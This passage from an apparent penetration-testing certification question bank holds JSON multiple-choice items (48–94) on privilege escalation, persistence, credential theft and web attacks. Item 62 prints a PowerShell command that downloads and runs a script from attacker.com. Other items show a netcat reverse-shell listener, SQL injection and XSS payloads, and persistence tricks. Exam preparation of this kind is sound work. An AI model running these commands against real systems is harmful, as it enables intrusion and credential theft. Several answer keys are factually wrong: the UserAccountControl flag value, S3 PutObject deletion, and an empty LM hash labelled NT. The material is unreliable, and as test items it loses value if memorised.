      "explanation": "Encoding the URL in hex or Base64 can evade detection by email security filters. JavaScript obfuscation is useful in browser-based attacks but may not bypass email security. OIDC attacks target authentication mechanisms. iFrame injection is detectable by modern email filters.",
      "examTip": "Encoding payloads in Base64 or hex can help bypass simple email security checks."
    },
    {
      "id": 48,
      "question": "A penetration tester identifies a Windows service running with SYSTEM privileges but finds that it does not properly validate user input. What type of exploit would MOST likely be effective?",
      "options": [
        "Command injection via user input manipulation",
        "DLL hijacking to execute arbitrary code",
        "Pass-the-Hash attack using stolen credentials",
        "Kerberoasting to extract service account hashes"
      ],
      "correctAnswerIndex": 1,
      "explanation": "DLL hijacking allows execution of arbitrary code by placing a malicious DLL in a location that the vulnerable service loads. Command injection depends on how input is processed. Pass-the-Hash and Kerberoasting are authentication attacks, not related to service exploitation.",
      "examTip": "DLL hijacking exploits services that load unverified libraries from user-controlled locations."
    },
    {
      "id": 49,
      "question": "A penetration tester discovers an exposed AWS S3 bucket. What is the MOST likely risk?",
      "options": [
        "Public access to sensitive data",
        "Privilege escalation within the AWS environment",
        "Direct execution of malicious scripts on the bucket",
        "Complete takeover of AWS IAM roles"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Exposed S3 buckets often allow unauthorized access to stored data. Privilege escalation requires additional misconfigurations. S3 buckets do not execute scripts directly. IAM takeover requires compromised credentials, not just an open bucket.",
      "examTip": "Always check AWS S3 bucket permissions using tools like `AWS CLI` or `S3Scanner`."
    },
    {
      "id": 50,
      "question": "Which of the following techniques would allow a penetration tester to maintain access to a compromised Linux system after a reboot?",
      "options": [
        "Modifying the crontab to execute a reverse shell",
        "Deploying an ARP poisoning attack",
        "Initiating a password spraying attack",
        "Executing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Adding a reverse shell to crontab ensures persistence after reboot. ARP poisoning affects network traffic but does not provide persistence. Password spraying attempts multiple logins but does not establish persistence. Kerberoasting is an authentication attack, not a persistence technique.",
      "examTip": "Persistence on Linux is often achieved through cron jobs, backdoored SSH keys, or modified startup scripts."
    },
    {
      "id": 51,
      "question": "A penetration tester gains access to a Linux system and wants to establish a hidden backdoor that survives reboots. Which of the following would be the MOST stealthy method?",
      "options": [
        "Adding a cron job that downloads and executes a reverse shell",
        "Modifying the SSH authorized_keys file to allow backdoor access",
        "Replacing the `sudo` binary with a malicious version",
        "Injecting a payload into a running process using `ptrace`"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Modifying `~/.ssh/authorized_keys` allows stealthy persistence without modifying system files or triggering detection mechanisms. Cron jobs are easily detected in logs. Replacing `sudo` is highly suspicious and can break functionality. `ptrace` injection is temporary and does not survive reboots.",
      "examTip": "SSH key-based persistence is often overlooked by defenders and is harder to detect than cron jobs."
    },
    {
      "id": 52,
      "question": "A penetration tester captures a Windows LSASS process dump and wants to extract credentials. Which tool would be the MOST effective?",
      "options": [
        "Volatility",
        "Impacket",
        "BloodHound",
        "Metasploit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Volatility is a memory forensics tool that can extract credentials from an LSASS dump. Impacket is used for network-based attacks. BloodHound maps Active Directory relationships. Metasploit is a framework for exploitation but does not specialize in LSASS memory analysis.",
      "examTip": "Dumping LSASS memory and extracting credentials is a common post-exploitation technique in Windows environments."
    },
    {
      "id": 53,
      "question": "A penetration tester is attempting to escalate privileges on a Windows machine and discovers the following unquoted service path:\n\n```\nC:\\Program Files\\Vulnerable App\\service.exe\n```\n\nWhat attack technique could be used to gain SYSTEM privileges?",
      "options": [
        "Placing a malicious executable in `C:\\Program Files\\Vulnerable.exe`",
        "Injecting a payload into the running service process",
        "Replacing `service.exe` with a malicious version",
        "Performing a Pass-the-Hash attack against the service account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unquoted service paths allow attackers to place a malicious binary in an earlier path (e.g., `C:\\Program Files\\Vulnerable.exe`) to be executed with SYSTEM privileges. Injecting payloads does not leverage the unquoted path issue. Replacing `service.exe` requires write access to the service directory. Pass-the-Hash is unrelated to service path exploits.",
      "examTip": "Use `wmic service get name,displayname,pathname` to check for unquoted service paths."
    },
    {
      "id": 54,
      "question": "A penetration tester is performing a cloud security assessment and discovers that an AWS IAM role allows the following action:\n\n```\n\"Action\": \"s3:PutObject\",\n\"Resource\": \"arn:aws:s3:::company-bucket/*\"\n```\n\nWhat is the MOST significant risk of this misconfiguration?",
      "options": [
        "An attacker can upload malicious files that execute on the server",
        "Sensitive files can be deleted from the S3 bucket",
        "Users can enumerate all objects stored in the S3 bucket",
        "The IAM role can be used to escalate privileges to root"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `s3:PutObject` permission allows an attacker to overwrite or delete existing objects, which could lead to data loss. It does not inherently enable execution on a server. Enumeration (`s3:ListBucket`) is not granted here. IAM privilege escalation requires additional misconfigurations.",
      "examTip": "Least privilege should be enforced in IAM roles to prevent unauthorized file uploads or modifications."
    },
    {
      "id": 55,
      "question": "Which of the following indicators in a network packet capture would MOST likely suggest an ongoing ARP poisoning attack?",
      "options": [
        "Multiple ARP replies with conflicting MAC addresses for the same IP",
        "A high number of failed login attempts over SMB",
        "A sudden increase in DNS queries for internal hosts",
        "Repeated SSH login attempts from the same source"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ARP poisoning involves multiple ARP replies mapping different MAC addresses to the same IP, tricking devices into routing traffic through an attacker's machine. Failed SMB logins suggest brute-force attempts. Increased DNS queries may indicate reconnaissance. SSH login attempts point to credential attacks.",
      "examTip": "Monitor for conflicting ARP responses and use static ARP entries to prevent poisoning attacks."
    },
    {
      "id": 56,
      "question": "A penetration tester discovers that a target system allows anonymous FTP access. What is the MOST effective next step?",
      "options": [
        "Upload a web shell to gain remote access",
        "Enumerate readable files and directories",
        "Brute-force login credentials for other accounts",
        "Attempt SQL injection through FTP commands"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Enumerating accessible files is the logical first step, as anonymous FTP may expose sensitive data. Uploading a web shell requires writable access. Brute-forcing accounts is unnecessary if anonymous access is enabled. SQL injection is not applicable to FTP services.",
      "examTip": "Always check for sensitive files in publicly accessible FTP directories before attempting further exploitation."
    },
    {
      "id": 57,
      "question": "Which attack technique exploits weak NTFS permissions to escalate privileges on a Windows system?",
      "options": [
        "DLL hijacking",
        "Token impersonation",
        "Weak service permissions",
        "Pass-the-Ticket attack"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Weak service permissions allow privilege escalation when users can modify or replace executables run as SYSTEM. DLL hijacking exploits library loading but does not rely on NTFS permissions. Token impersonation abuses access tokens. Pass-the-Ticket is a Kerberos attack, unrelated to file system permissions.",
      "examTip": "Use `icacls` to analyze NTFS permissions and identify misconfigurations for privilege escalation."
    },
    {
      "id": 58,
      "question": "A penetration tester intercepts the following HTTP request:\n\n```\nPOST /login HTTP/1.1\nHost: app.target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"' OR '1'='1\"}\n```\n\nWhat would be the expected response from a vulnerable application?",
      "options": [
        "An authentication bypass, granting admin access",
        "A SQL syntax error displayed in the response",
        "A forced logout due to session expiration",
        "A redirection to a password reset page"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload (`' OR '1'='1`) is a SQL injection attack that forces authentication bypass if the application is vulnerable. A syntax error may occur if filtering is in place. Session expiration and password reset redirections are unrelated to SQL injection.",
      "examTip": "Always use parameterized queries to prevent SQL injection vulnerabilities."
    },
    {
      "id": 59,
      "question": "Which of the following Windows binaries is MOST commonly abused for executing malicious payloads while bypassing security controls?",
      "options": [
        "rundll32.exe",
        "explorer.exe",
        "calc.exe",
        "cmd.exe"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`rundll32.exe` is a LOLBin (Living Off the Land Binary) frequently abused to execute DLL-based payloads stealthily. `explorer.exe` is a system GUI component. `calc.exe` is unrelated to privilege escalation. `cmd.exe` is monitored by security tools and not as stealthy as `rundll32.exe`.",
      "examTip": "Many Windows built-in binaries can be leveraged for stealthy code execution; `rundll32.exe` is a common choice."
    },
    {
      "id": 60,
      "question": "Which of the following is a common defense against Pass-the-Hash attacks?",
      "options": [
        "Enabling Windows Credential Guard",
        "Implementing DMARC policies",
        "Enforcing strict firewall rules",
        "Using AES-256 for password hashing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Windows Credential Guard prevents Pass-the-Hash attacks by isolating credentials in a secure environment. DMARC is for email security. Firewalls help with network segmentation but do not prevent credential attacks. AES-256 is irrelevant to NTLM hash security.",
      "examTip": "Windows Credential Guard mitigates Pass-the-Hash attacks by protecting credential storage."
    },
    {
      "id": 61,
      "question": "A penetration tester runs the following command on a compromised Linux system:\n\n```\ncat /proc/self/environ\n```\n\nWhat is the MOST likely goal of this action?",
      "options": [
        "To extract system environment variables for credential leakage",
        "To identify running processes and their associated PIDs",
        "To enumerate network connections to external hosts",
        "To list active cron jobs for persistence analysis"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Reading `/proc/self/environ` can expose sensitive environment variables, including credentials and API keys. It does not list running processes (`ps aux` does that). Network connections are checked via `netstat` or `ss`. Cron jobs are listed with `crontab -l`.",
      "examTip": "Environment variables often contain sensitive data, making them a valuable target for attackers."
    },
    {
      "id": 62,
      "question": "A penetration tester executes the following command:\n\n```\npowershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\n```\n\nWhat is the PRIMARY goal of this command?",
      "options": [
        "To download and execute a PowerShell script without security restrictions",
        "To exploit a misconfigured web client service on the target machine",
        "To create a reverse shell using PowerShell's built-in features",
        "To escalate privileges by leveraging a PowerShell vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command downloads and executes a remote PowerShell script while bypassing execution restrictions. It does not exploit a specific service. A reverse shell may be part of the script but is not guaranteed. Privilege escalation requires additional exploitation steps.",
      "examTip": "PowerShell's `-ep bypass` flag disables execution policy, making it a common attack vector."
    },
    {
      "id": 63,
      "question": "A penetration tester is performing a MITM attack and captures the following credentials:\n\n```\nusername=admin&password=$2y$10$O0rjk2vhfN8OPvLkeMmb6Ol7DRp5HjkHy3V/.0sUNYH29mQ0u5JHe\n```\n\nWhat hashing algorithm is MOST likely being used?",
      "options": [
        "bcrypt",
        "MD5",
        "SHA-256",
        "NTLM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `$2y$` prefix indicates bcrypt hashing. MD5 hashes do not include a prefix. SHA-256 does not have the `$2y$` format. NTLM hashes look different and are typically 32-character hex values.",
      "examTip": "The prefix of a hashed password often reveals the algorithm used for hashing."
    },
    {
      "id": 64,
      "question": "Which of the following tools would be the BEST choice for exploiting a Java deserialization vulnerability?",
      "options": [
        "ysoserial",
        "sqlmap",
        "Responder",
        "CrackMapExec"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ysoserial generates malicious Java serialized objects to exploit deserialization vulnerabilities. sqlmap is for SQL injection. Responder captures network authentication hashes. CrackMapExec automates network attacks but does not target Java deserialization.",
      "examTip": "Java deserialization attacks rely on crafting malicious serialized objects with tools like ysoserial."
    },
    {
      "id": 65,
      "question": "A penetration tester intercepts the following HTTP request:\n\n```\nGET /api/v1/userinfo?userid=1234 HTTP/1.1\nHost: target.com\nAuthorization: Bearer abcdef123456\n```\n\nWhat attack technique could be used to escalate privileges?",
      "options": [
        "Changing `userid=1234` to `userid=9999` for IDOR exploitation",
        "Injecting SQL syntax into the `Authorization` header",
        "Encoding the request parameters in Base64 to bypass filtering",
        "Altering the `Host` header to gain administrative access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Insecure Direct Object Reference (IDOR) occurs when changing `userid=1234` allows access to another user's data. SQL injection would typically be attempted in query parameters. Encoding parameters does not bypass authorization logic. Host header manipulation affects routing, not authentication.",
      "examTip": "IDOR vulnerabilities arise when applications fail to validate user permissions on requested resources."
    },
    {
      "id": 66,
      "question": "A penetration tester uses `crackmapexec` to spray a password across multiple hosts. Which authentication method is being targeted?",
      "options": [
        "NTLM authentication",
        "Kerberos ticket authentication",
        "OAuth-based authentication",
        "Certificate-based authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "CrackMapExec is commonly used for NTLM authentication attacks, including password spraying. Kerberos ticket authentication requires different tools. OAuth and certificate-based authentication are unrelated to NTLM spraying.",
      "examTip": "Password spraying against NTLM authentication avoids account lockouts by limiting incorrect attempts per user."
    },
    {
      "id": 67,
      "question": "A penetration tester captures the following SSH handshake:\n\n```\nServer: OpenSSH_7.2p2 Ubuntu 4ubuntu2.8\nClient: SSH-2.0-PuTTY_Release_0.73\n```\n\nWhat is the MOST likely next step in the exploitation process?",
      "options": [
        "Checking for known vulnerabilities in OpenSSH 7.2p2",
        "Performing an NTLM relay attack",
        "Attempting Kerberos ticket injection",
        "Executing a credential stuffing attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Identifying the OpenSSH version allows the tester to check for known vulnerabilities. NTLM relay is unrelated to SSH. Kerberos ticket injection is for Active Directory environments. Credential stuffing could be attempted but is not the most targeted approach here.",
      "examTip": "Always check service versions against known CVEs before attempting brute-force attacks."
    },
    {
      "id": 68,
      "question": "A penetration tester is analyzing an Active Directory environment and finds a user account with the following settings:\n\n```\nUserAccountControl: 0x1200\n```\n\nWhat does this indicate?",
      "options": [
        "The account has no password expiration",
        "The account is disabled",
        "The account is locked due to failed logins",
        "The account is part of a nested group with administrative privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A `0x1200` value in `UserAccountControl` means the account has the `DONT_EXPIRE_PASSWORD` flag set. A disabled account would have a different flag. Lockout flags are separate. Nested group membership does not affect `UserAccountControl` values.",
      "examTip": "UserAccountControl flags reveal misconfigurations that can be exploited in privilege escalation."
    },
    {
      "id": 69,
      "question": "A penetration tester attempts to crack a Windows password hash obtained from the SAM database. Which of the following tools would be MOST effective?",
      "options": [
        "John the Ripper",
        "Burp Suite",
        "Gobuster",
        "Nmap"
      ],
      "correctAnswerIndex": 0,
      "explanation": "John the Ripper is used for offline password cracking, including NTLM hashes. Burp Suite is for web testing. Gobuster is for directory enumeration. Nmap is a network scanning tool.",
      "examTip": "Use `john --format=NT` to crack NTLM hashes efficiently."
    },
    {
      "id": 70,
      "question": "A penetration tester is analyzing a TLS-encrypted connection and finds that the server supports the following cipher suite:\n\n```\nTLS_RSA_WITH_RC4_128_SHA\n```\n\nWhat is the MOST significant security risk?",
      "options": [
        "The use of RC4 makes the connection vulnerable to cryptographic attacks",
        "SHA-1 hashing allows for collision-based attacks",
        "RSA encryption is susceptible to quantum computing attacks",
        "The TLS version may be outdated and insecure"
      ],
      "correctAnswerIndex": 0,
      "explanation": "RC4 is a weak encryption algorithm known for biases and vulnerabilities. SHA-1 is weak but not the primary concern here. RSA is not currently vulnerable to practical quantum attacks. TLS versions matter, but the biggest issue here is RC4.",
      "examTip": "RC4 is deprecated due to significant security weaknesses—avoid using it in secure communications."
    },
    {
      "id": 71,
      "question": "A penetration tester discovers the following entry in a web application's HTTP response:\n\n```\nStrict-Transport-Security: max-age=0\n```\n\nWhat is the primary security risk associated with this configuration?",
      "options": [
        "The application is vulnerable to SSL stripping attacks",
        "TLS certificates can be forged to bypass authentication",
        "Session cookies can be stolen via cross-site scripting (XSS)",
        "User credentials can be intercepted even when using HTTPS"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`max-age=0` disables HSTS, making the application vulnerable to SSL stripping, which forces clients to connect over HTTP instead of HTTPS. TLS certificate forging is unrelated. XSS does not depend on HSTS. HTTPS protects credentials, but SSL stripping forces HTTP fallback.",
      "examTip": "HSTS ensures browsers enforce HTTPS—disabling it allows downgrade attacks like SSL stripping."
    },
    {
      "id": 72,
      "question": "A penetration tester finds a MySQL server that allows connections without authentication from a specific IP range. What is the MOST likely misconfiguration?",
      "options": [
        "A wildcard entry in the MySQL user table",
        "Anonymous login enabled via the root account",
        "The server using a weak hashing algorithm for stored passwords",
        "The MySQL service running with excessive privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A wildcard (`%`) in the MySQL user table can allow unauthenticated access from any host. Anonymous login would allow all users to connect, not just a specific IP range. Weak password hashing affects stored credentials, not authentication bypass. High privileges affect system impact but not authentication.",
      "examTip": "Check MySQL's user table for wildcard entries that may allow unintended access."
    },
    {
      "id": 73,
      "question": "A penetration tester wants to exploit a stored cross-site scripting (XSS) vulnerability in a web application. Which payload would be the MOST effective?",
      "options": [
        "`<script>document.cookie</script>`",
        "`<img src='x' onerror='alert(document.domain)'>`",
        "`SELECT * FROM users WHERE username='admin' --`",
        "`../../../etc/passwd`"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `<img>` tag with `onerror` executes JavaScript in a stored XSS attack. The `<script>` tag may be filtered. The SQL injection payload is unrelated to XSS. The directory traversal payload targets file access, not JavaScript execution.",
      "examTip": "Stored XSS can persist across sessions, making it a powerful attack vector."
    },
    {
      "id": 74,
      "question": "Which of the following tools would be MOST effective for performing a password spraying attack against an Office 365 environment?",
      "options": [
        "o365spray",
        "Hashcat",
        "Mimikatz",
        "Responder"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`o365spray` is designed for password spraying against Office 365. Hashcat is a password cracking tool. Mimikatz extracts credentials from memory. Responder is for capturing network authentication hashes, not spraying against cloud services.",
      "examTip": "Password spraying avoids account lockouts by trying a few passwords across many accounts."
    },
    {
      "id": 75,
      "question": "A penetration tester executes the following command:\n\n```\nnc -lvp 4444\n```\n\nWhat is the primary purpose of this command?",
      "options": [
        "To set up a reverse shell listener",
        "To perform a port scan on a target",
        "To encrypt communication using TLS",
        "To extract credentials from a target system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nc -lvp 4444` command sets up a Netcat listener on port 4444 for a reverse shell connection. Port scanning requires `-z` mode. TLS encryption is not enabled by Netcat by default. Extracting credentials requires additional post-exploitation techniques.",
      "examTip": "Netcat is a powerful tool for setting up listeners and transferring data between systems."
    },
    {
      "id": 76,
      "question": "A penetration tester discovers that a target server supports SMBv1. What is the MOST significant risk associated with this?",
      "options": [
        "The server is vulnerable to the EternalBlue exploit",
        "NTLM authentication can be bypassed",
        "The server's TLS implementation is outdated",
        "SMB relay attacks become impossible"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMBv1 is vulnerable to EternalBlue (CVE-2017-0144), which allows remote code execution. NTLM bypass is unrelated to SMB versioning. TLS is used for web encryption, not SMB. SMB relay attacks are still possible if signing is disabled.",
      "examTip": "Disabling SMBv1 mitigates exploits like EternalBlue and reduces lateral movement risks."
    },
    {
      "id": 77,
      "question": "A penetration tester captures a Windows hash from an authentication attempt:\n\n```\n$NT$aad3b435b51404eeaad3b435b51404ee\n```\n\nWhich attack technique would be MOST effective in leveraging this hash?",
      "options": [
        "Pass-the-Hash",
        "Kerberoasting",
        "Token Impersonation",
        "Brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pass-the-Hash (PtH) allows authentication using NTLM hashes without cracking them. Kerberoasting targets Kerberos tickets. Token impersonation manipulates process tokens. Brute-force attacks are ineffective against NTLM hashes without a cracking step.",
      "examTip": "Pass-the-Hash allows authentication with NTLM hashes without knowing the plaintext password."
    },
    {
      "id": 78,
      "question": "A penetration tester is conducting a wireless security assessment and identifies a network with WPS enabled. What is the primary risk associated with this?",
      "options": [
        "The PIN can be brute-forced to reveal the WPA2 passphrase",
        "Session keys are transmitted in plaintext",
        "The encryption algorithm is vulnerable to downgrade attacks",
        "The network is susceptible to Evil Twin attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "WPS PINs can be brute-forced to retrieve the WPA2 passphrase. Session keys are encrypted. Downgrade attacks affect SSL/TLS, not WPA2. Evil Twin attacks are a separate wireless attack vector.",
      "examTip": "Always disable WPS to prevent brute-force attacks that expose WPA2 credentials."
    },
    {
      "id": 79,
      "question": "A penetration tester gains access to a web server and discovers the following scheduled cron job:\n\n```\n0 * * * * /usr/local/bin/backup.sh\n```\n\nWhich of the following would be the MOST effective way to establish persistence?",
      "options": [
        "Inject a reverse shell into `backup.sh`",
        "Modify `/etc/passwd` to create a root backdoor",
        "Overwrite the `sudo` binary with a malicious version",
        "Execute a kernel exploit to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying `backup.sh` ensures execution of a malicious payload every hour. Modifying `/etc/passwd` is detectable. Overwriting `sudo` could break system functionality. Kernel exploits may escalate privileges but do not ensure persistence.",
      "examTip": "Modifying scheduled scripts is a common persistence technique on Linux systems."
    },
    {
      "id": 80,
      "question": "Which of the following tools is BEST suited for enumerating user permissions and trust relationships in an Active Directory environment?",
      "options": [
        "BloodHound",
        "Responder",
        "Impacket",
        "Mimikatz"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps user permissions and trust relationships in Active Directory. Responder captures network authentication requests. Impacket provides various network attack scripts. Mimikatz extracts credentials from memory but does not analyze trust relationships.",
      "examTip": "BloodHound is a powerful tool for visualizing AD relationships and identifying privilege escalation paths."
    },
    {
      "id": 81,
      "question": "A penetration tester is performing an internal assessment and discovers an outdated Windows 7 machine with SMBv1 enabled. Which of the following attack techniques is MOST likely to succeed?",
      "options": [
        "Exploiting EternalBlue to gain remote code execution",
        "Performing an NTLM relay attack against Active Directory",
        "Capturing and cracking Kerberos TGTs for lateral movement",
        "Conducting a Pass-the-Hash attack against the machine"
      ],
      "correctAnswerIndex": 0,
      "explanation": "EternalBlue (CVE-2017-0144) is an SMBv1 exploit that allows remote code execution on vulnerable Windows machines. NTLM relay requires additional conditions. Kerberos TGT cracking is unrelated to SMB. Pass-the-Hash can be used post-exploitation but does not directly exploit SMBv1.",
      "examTip": "If SMBv1 is enabled on older Windows systems, check for EternalBlue (MS17-010) as a potential exploit."
    },
    {
      "id": 82,
      "question": "A penetration tester finds the following line in a `.git/config` file on a publicly accessible server:\n\n```\n[remote \"origin\"]\nurl = https://user:password@private-repo.com/repository.git\n```\n\nWhat is the MOST significant risk associated with this finding?",
      "options": [
        "An attacker can extract valid credentials and gain access to the private repository",
        "The attacker can modify files in the public Git repository",
        "It allows remote code execution on the server via Git hooks",
        "The repository's commit history can be rewritten to hide changes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The presence of plaintext credentials in the `.git/config` file exposes them to attackers, allowing unauthorized access to the private repository. Modifying public files depends on repository permissions. Remote code execution via Git hooks requires further misconfigurations. Commit history manipulation is unrelated.",
      "examTip": "Always check for exposed `.git` directories and configuration files during web assessments."
    },
    {
      "id": 83,
      "question": "A penetration tester is analyzing a Windows system and discovers the following running process:\n\n```\nsvchost.exe -k netsvcs\n```\n\nWhich of the following would be the BEST next step?",
      "options": [
        "Check for process injection or DLL sideloading in `svchost.exe`",
        "Terminate the process immediately to prevent further execution",
        "Modify the Windows registry to disable the service",
        "Use `netstat -ano` to determine if the process is listening on a network port"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`svchost.exe` is a legitimate Windows process, but attackers frequently use process injection or DLL sideloading to run malicious code. Terminating it can crash the system. Registry modifications are unnecessary at this stage. Checking network connections helps, but does not confirm an injection attack.",
      "examTip": "Process injection techniques commonly abuse `svchost.exe` to maintain stealthy persistence."
    },
    {
      "id": 84,
      "question": "A penetration tester captures the following SMB authentication attempt in Responder:\n\n```\nUser: target\\admin\nNTLMv2 Hash: 8f98a7f64d9eaa...\n```\n\nWhich of the following actions would be the MOST effective next step?",
      "options": [
        "Perform an offline brute-force attack on the captured NTLMv2 hash",
        "Relay the NTLM hash to authenticate against another SMB service",
        "Use a Kerberoasting attack to extract additional credentials",
        "Inject the hash into a new authentication request for privilege escalation"
      ],
      "correctAnswerIndex": 1,
      "explanation": "NTLM relay allows authentication without cracking the hash. Brute-forcing NTLMv2 hashes is slow and inefficient. Kerberoasting targets Kerberos tickets, not NTLM. Injecting NTLM hashes (Pass-the-Hash) works for NTLMv1, but NTLMv2 requires relaying.",
      "examTip": "NTLM relay is effective against SMB if signing is not enforced on the target system."
    },
    {
      "id": 85,
      "question": "A penetration tester is scanning a web application and finds the following response header:\n\n```\nX-Frame-Options: SAMEORIGIN\n```\n\nWhat security risk is being mitigated by this header?",
      "options": [
        "Clickjacking attacks",
        "Cross-Site Scripting (XSS)",
        "SQL injection",
        "Cross-Origin Resource Sharing (CORS) abuse"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`X-Frame-Options: SAMEORIGIN` prevents clickjacking attacks by disallowing the site from being embedded in an `<iframe>` from another domain. XSS and SQL injection are unrelated. CORS policies regulate cross-origin requests but do not prevent clickjacking.",
      "examTip": "Clickjacking attacks trick users into interacting with hidden UI elements in embedded iframes."
    },
    {
      "id": 86,
      "question": "Which of the following techniques would allow an attacker to execute arbitrary code in a Python environment with limited privileges?",
      "options": [
        "Exploiting an insecure `pickle.loads()` deserialization function",
        "Injecting SQL syntax into a database query",
        "Performing a brute-force attack against the Python interpreter",
        "Crafting an XML payload to exploit an XXE vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `pickle.loads()` function is dangerous because it allows deserialization of arbitrary objects, leading to code execution. SQL injection affects databases, not Python execution. Brute-forcing Python interpreters is impractical. XXE attacks target XML parsers, not Python applications.",
      "examTip": "Avoid using `pickle.loads()` with untrusted data, as it can lead to remote code execution."
    },
    {
      "id": 87,
      "question": "A penetration tester identifies an open Jenkins instance and gains access to the console. What is the MOST effective way to escalate privileges?",
      "options": [
        "Execute system commands using a pipeline script",
        "Modify the `.htaccess` file to redirect users to a phishing site",
        "Use an SSRF attack to access internal metadata services",
        "Upload a web shell to the Jenkins instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Jenkins allows executing system commands via pipeline scripts, providing code execution on the host machine. `.htaccess` modifications do not escalate privileges. SSRF may expose internal services but does not provide direct control. Web shells depend on file upload permissions.",
      "examTip": "Jenkins often runs with high privileges—gaining console access can lead to full system compromise."
    },
    {
      "id": 88,
      "question": "Which of the following Windows persistence techniques involves creating a hidden registry key to execute malicious payloads?",
      "options": [
        "Modifying `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`",
        "Creating a malicious DLL in `C:\\Windows\\System32`",
        "Abusing `schtasks` to create a scheduled task",
        "Hijacking a Windows service binary path"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying `Run` registry keys allows persistence by executing a payload at user login. Creating a malicious DLL requires another execution mechanism. Scheduled tasks are another persistence technique but are not registry-based. Service hijacking modifies binaries, not registry keys.",
      "examTip": "Registry-based persistence is stealthy and often overlooked in security audits."
    },
    {
      "id": 89,
      "question": "A penetration tester captures network traffic and notices a high number of DNS queries for random-looking subdomains. What attack is MOST likely occurring?",
      "options": [
        "DNS tunneling",
        "Domain hijacking",
        "SSL stripping",
        "ARP poisoning"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS tunneling encodes data in DNS queries, often appearing as frequent requests for random subdomains. Domain hijacking involves taking over domain ownership. SSL stripping downgrades HTTPS to HTTP. ARP poisoning manipulates local network traffic, not DNS queries.",
      "examTip": "DNS tunneling is commonly used for exfiltrating data while bypassing network restrictions."
    },
    {
      "id": 90,
      "question": "A penetration tester exploits a web application vulnerability and gains access to an AWS instance's metadata API. What sensitive data is MOST likely at risk?",
      "options": [
        "IAM role credentials",
        "SSH private keys",
        "Database connection strings",
        "Application source code"
      ],
      "correctAnswerIndex": 0,
      "explanation": "AWS metadata services expose IAM role credentials, allowing privilege escalation. SSH keys, database credentials, and source code may be stored on the instance but are not directly accessible via the metadata API.",
      "examTip": "AWS metadata services should be restricted to prevent unauthorized access to IAM role credentials."
    },
    {
      "id": 91,
      "question": "A penetration tester is reviewing an Active Directory environment and finds that unconstrained delegation is enabled for a specific service account. What is the MOST significant risk associated with this misconfiguration?",
      "options": [
        "An attacker can impersonate any user, including domain admins",
        "The account can be brute-forced to gain initial access",
        "Password hashes are stored insecurely and can be cracked",
        "The Kerberos TGT can be extracted and used for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unconstrained delegation allows a compromised service account to impersonate any user, including domain admins, leading to full domain compromise. Brute-force attacks are separate from delegation issues. Password hashes are not necessarily exposed. Kerberos TGT extraction occurs in Golden Ticket attacks but is not directly tied to delegation misconfigurations.",
      "examTip": "Disable unconstrained delegation to prevent attackers from impersonating privileged users."
    },
    {
      "id": 92,
      "question": "Which of the following tools would be MOST useful for extracting credentials from a Windows LSASS process in a post-exploitation scenario?",
      "options": [
        "Mimikatz",
        "Responder",
        "Nmap",
        "sqlmap"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz is designed to extract credentials from LSASS. Responder is used for capturing network authentication hashes. Nmap is a network scanning tool. sqlmap is used for SQL injection testing.",
      "examTip": "LSASS credential dumping is a critical post-exploitation technique for privilege escalation."
    },
    {
      "id": 93,
      "question": "A penetration tester is testing an IoT device and discovers that the firmware is stored in a publicly accessible location. What is the MOST likely security risk?",
      "options": [
        "An attacker can reverse-engineer the firmware to find vulnerabilities",
        "The firmware can be modified to inject SQL injection payloads",
        "Malicious actors can use the firmware to create phishing attacks",
        "The IoT device is susceptible to Kerberoasting attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Publicly accessible firmware allows attackers to reverse-engineer it and discover vulnerabilities. Injecting SQL payloads requires a vulnerable database. Phishing attacks do not rely on firmware access. Kerberoasting is specific to Active Directory environments.",
      "examTip": "Always check if firmware is publicly accessible, as it can expose security flaws."
    },
    {
      "id": 94,
      "question": "A penetration tester exploits a vulnerable web application and gains access to an AWS EC2 instance. Which of the following actions would allow the tester to escalate privileges?",
      "options": [
        "Querying the AWS metadata service for IAM credentials",
        "Running `john` to crack user account passwords",
        "Exploiting a buffer overflow in the kernel",
        "Enumerating the `/etc/passwd` file for misconfigurations"
      ],
      "correctAnswerIndex": 0,
